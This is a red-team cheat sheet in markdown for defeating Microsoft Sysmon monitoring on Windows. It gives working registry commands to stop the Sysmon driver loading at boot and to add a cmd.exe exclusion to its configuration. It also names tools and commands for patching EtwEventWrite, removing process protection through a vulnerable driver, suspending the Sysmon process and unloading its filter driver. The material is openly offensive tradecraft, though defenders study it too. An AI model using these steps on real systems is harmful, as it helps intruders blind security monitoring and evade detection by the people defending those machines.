## Sysmon
- [System Monitor (Sysmon)](#system-monitor-sysmon)
- [Sysmon architecture](#sysmon-architecture)
- [Attacking Sysmon](#attacking-sysmon)
	- [Removing kernel callbacks](#removing-kernel-callbacks)
	- [Altitude takeover](#altitude-takeover)
	- [Boot Settings](#boot-settings)
	- [Overwrite config file](#overwrite-config-file)
	- [ETW Patching](#etw-patching)
	- [Suspending and resuming the process](#suspending-and-resuming-the-process)
	- [Unloading sysmon driver](#unloading-sysmon-driver)

## System Monitor (Sysmon)
### Sysmon architecture
- https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Sysmon consists of a client program `Sysmon.exe` and a driver `SysmonDrv.sys`.
	- The driver registers kernel callbacks for Image, Thread, Process, Registry and FileSystem operations.
	- The client collects network (DNS) telemetry from the ETW session and from the driver and writes it to a ETW session
	- Uses a `XML` file for configuration, which telemetry sources is enabled and what to include and exclude

### Attacking Sysmon
### Removing kernel callbacks
- [Driver Attacks – Vulnerable drivers](Driver-Attacks.md#vulnerable-drivers)

### Altitude takeover
- [Manual Altitude takeover](Endpoint Detection Response (EDR).md#manual-altitude-takeover)

### Boot Settings
### Example Boot settings
- What does it do
	- [RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa) - Changes the `start` value of the `SysmonDrv` to `3` (demand start) or revert it back to `0` (boot start)
- Requirements;
	- Local administrator / system privileges
	- Restart of the Windows machine
- Link to code (Not published yet)

```
.\BootSettings.exe -e
```

### Manually change boot settings
- Requirements;
	- Local administrator / system privileges
	- Restart of the Windows machine

#### Find driver name
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Sysmon\Parameters" /v DriverName
```

#### Change the start value
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv" /v Start /t REG_DWORD /d 3 /f
```

#### Reboot the system
```
shutdown /r /t 0
```

### Overwrite config file

### Example overwriting config file
- What does it do
	- Reads the registry value and overwrites the original configuration file with new content
- Requirements;
	- Local administrator / system privileges
	- Restart of the sysmon process
- See manual steps to copy and add exclusion to config file

```
.\OverwriteConfigFile --replace <NEW CONFIG FILE PATH> --config <SYSMON CONFIG FILE PATH>
```

### Manually overwriting config file
- Requirements;
	- Local administrator / system privileges
	- Restart of the sysmon process

#### Find driver name
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Sysmon\Parameters" /v DriverName
```

#### Find current config file
```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters" /v ConfigFile
```

#### Copy the config file
```
copy "C:\Program Files\Sysmon\sysmonconfig.xml" "C:\Program Files\Sysmon\sysmonconfig_new.xml"
```

#### Add PE exclusion to the config file
- Adds an exclusion for a specific PE file

```
<!-- Image Exclusion -->
<Image condition="is">C:\Windows\System32\cmd.exe</Image>

# Add it within
    <RuleGroup groupRelation="or">
      <ProcessCreate onmatch="exclude">
```

#### Change config file registry value
- Changes the config file path

```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters" /v ConfigFile /t REG_SZ /d "C:\Program Files\Sysmon\sysmonconfig_new.xml" /f
```

#### Update sysmon with the new configuration
- Loads the new configuration file

```
sysmon -c "C:\Program Files\Sysmon\sysmonconfig_new.xml"
```

### ETW Patching
- What does it do
	- Apply ETW patch to the sysmon process, by writing the `0x48 0x33 0xc0 0xc3` patch to `EtwEventWrite` function inside the sysmon process
- `Sysmon.exe` is a protected process and it requires removing before being able to patch ETW.
- Requirements;
	- Loading a vulnerable driver to remove PPL protections
	- Local administrator / system privileges

#### Remove the protection of sysmon process
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\ProtectionChanger.exe -p <SYSMON PID> -v 0x00
```

#### Patch EtwEventWrite
- Link to code (Not published yet)

```
.\PatchETWRemoteProcess.exe -t sysmon64.exe
```

### Suspending and resuming the process
- What does it do
	- Suspend the `Sysmon.exe` or `sysmon64.exe` process, which stops generating events from information from the driver
- `Sysmon.exe` is a protected process and it requires removing before being able to suspend the process
- Requirements;
	- Loading a vulnerable driver to remove PPL protections
	- Local administrator / system privileges

#### Remove the protection of sysmon process
- https://github.com/0xJs/BYOVD_read_write_primitive

```
.\ProtectionChanger.exe -p <SYSMON PID> -v 0x00
```

#### Suspend the process
- What does it do
	- Suspends the target process
- Logs will be send after resuming the process again

```
.\SuspendRemoteProcess.exe -t sysmon64.exe -a suspend
```

### Unloading sysmon driver
- What does it do
	- Unloads the driver using the [FilterUnload](https://learn.microsoft.com/en-us/windows/win32/api/fltuser/nf-fltuser-filterunload) win32 API.
- Requirements;
	- Local administrator / system privileges
- Link to code (Not published yet)

```
.\FilterUnload -d
```